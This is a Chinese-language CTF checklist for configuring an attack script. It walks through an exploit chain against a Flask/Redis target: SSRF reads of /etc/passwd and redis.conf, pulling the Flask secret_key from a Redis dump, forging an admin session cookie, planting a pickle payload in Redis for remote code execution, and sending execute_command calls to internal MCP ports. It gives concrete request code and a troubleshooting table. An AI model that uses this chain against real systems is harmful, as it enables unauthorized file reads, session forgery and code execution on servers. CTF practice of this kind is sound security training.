# CTF 实战参数完整检查清单

## 🔴 必改参数（1个）

```python
# L17 - 靶机地址
TARGET_URL = "http://____________"  # ← 填题目给的地址
```

---

## 🟡 根据题目调整的参数（18个）

### 1. API端点（5个）

```python
# L18 - SSRF入口
SSRF_ENDPOINT = "/api/avatar/download"
# 常见变体: /fetch, /proxy, /image, /url, /load, /download, /get

# L19 - 登录接口
LOGIN_ENDPOINT = "/api/login"
# 常见变体: /login, /user/login, /auth/login, /api/auth/login

# L20 - 注册接口
REGISTER_ENDPOINT = "/api/register"
# 常见变体: /register, /user/register, /signup, /api/user/signup

# L21 - 管理后台
ADMIN_USERS_ENDPOINT = "/admin/users"
# 常见变体: /admin, /admin/panel, /dashboard, /manage, /backend

# L436 - 触发反序列化的页面
session.get(f"{TARGET_URL}/admin/online_users", timeout=10)
# 改成题目中会读取Redis并pickle.loads的页面
```

### 2. 请求参数（3个）

```python
# L41, L61 - 登录注册的JSON字段名
json={"username": username, "password": password}
# 可能要改成: {"user": ..., "pass": ...}
# 或: {"email": ..., "pwd": ...}

# L86 - SSRF的URL参数名
params={"url": ssrf_url}
# 可能要改成: {"target": ...}, {"src": ...}, {"path": ...}, {"link": ...}
```

### 3. 密钥提取（3个）

```python
# L260 - secret_key的长度（正则）
hex_pattern = re.compile(r'[0-9a-fA-F]{64}')
# 如果密钥不是64位，改成: {32}, {48}, {128} 等

# L271 - Redis中存储密钥的键名
if not secret_key and b'app:secret_key' in dump_bytes:
# 可能要改成: b'flask:secret_key', b'SECRET_KEY', b'session:secret'

# L559 - Redis配置文件路径
redis_conf = exploit_ssrf_file_read(session, "/etc/redis/redis.conf")
# 可能要改成: /etc/redis.conf, /usr/local/etc/redis.conf, /opt/redis/redis.conf
```

### 4. Session伪造（4个）

```python
# L331-335 - 伪造的session数据结构
session_data = {
    'username': username,    # 字段名可能不同
    'user_id': 1,            # admin的ID可能是0或其他
    'is_admin': True,        # 字段名可能是 'admin', 'role'
    'logged_in': True        # 可能不需要这个字段
}
# 需要根据题目实际的session结构调整

# L357, L368 - Cookie名称
session.cookies.set('session', forged_cookie)
# 可能要改成: 'flask_session', 'sid', 'token', 'auth'
```

### 5. Pickle RCE（2个）

```python
# L423 - 写入Pickle payload的Redis键名
redis_key = "online_user:attacker"
# 改成题目中会被反序列化的键，如: "user:session:xxx", "cache:data"

# L436 - 触发反序列化的URL（同上面API端点）
```

### 6. MCP攻击（2个）

```python
# L462 - MCP服务端口
mcp_ports = [3000, 8080, 9000]
# 根据题目提示的内网服务端口调整

# L472 - MCP协议方法名
sock.send(b'{"method": "execute_command", "params": {"cmd": "id"}}')
# 根据题目MCP服务的实际API调整
```

---

## 🟢 不用改的参数

| 参数 | 原因 |
|-----|------|
| `REDIS_HOST/PORT/PASSWORD` | 自动从redis.conf解析 |
| `/tmp/*` 路径 | Linux标准临时目录 |
| `salt='cookie-session'` | Flask框架固定值 |
| Base64正则 | 通用格式 |

---

## 实战调试流程

### Step 1: 先跑一遍，看哪里报错

```bash
python3 ssrf_attack.py
```

### Step 2: 根据报错定位问题

| 报错信息 | 问题 | 修改位置 |
|---------|------|---------|
| `连接超时/拒绝` | TARGET_URL错误 | L17 |
| `注册失败 404` | REGISTER_ENDPOINT错误 | L20 |
| `登录失败 404` | LOGIN_ENDPOINT错误 | L19 |
| `SSRF读取失败 404` | SSRF_ENDPOINT错误 | L18 |
| `SSRF读取失败 400` | SSRF参数名错误 | L86 |
| `无法读取Redis配置` | redis.conf路径错误 | L559 |
| `无法提取secret_key` | 键名或正则不匹配 | L260, L271 |
| `伪造session失败` | session结构不对 | L331-335 |
| `访问管理员页面失败` | Cookie名或端点错误 | L357, L21 |
| `RCE无响应` | Pickle键名或触发URL错误 | L423, L436 |

### Step 3: 手动探测技巧

```python
# 在Python交互环境逐步测试
import requests

# 1. 测试注册
r = requests.post("http://靶机/api/register", json={"username":"test","password":"123"})
print(r.status_code, r.text)
# 如果404，换路径: /register, /signup, /user/register

# 2. 测试SSRF
s = requests.Session()
s.post("http://靶机/api/login", json={"username":"test","password":"123"})
r = s.get("http://靶机/api/avatar/download", params={"url":"file:///etc/passwd"})
print(r.text)
# 如果失败，换参数名: target=, src=, path=

# 3. 查看dump内容找键名
# 如果secret_key提取失败，打印dump内容人工查找
print(dump_content)
# 搜索关键词: secret, key, flask, session
```

---

## 快速替换命令

```bash
# Linux/Mac 批量替换TARGET_URL
sed -i 's|http://target.com|http://实际地址|g' ssrf_attack.py

# Windows PowerShell
(Get-Content ssrf_attack.py) -replace 'http://target.com', 'http://实际地址' | Set-Content ssrf_attack.py
```
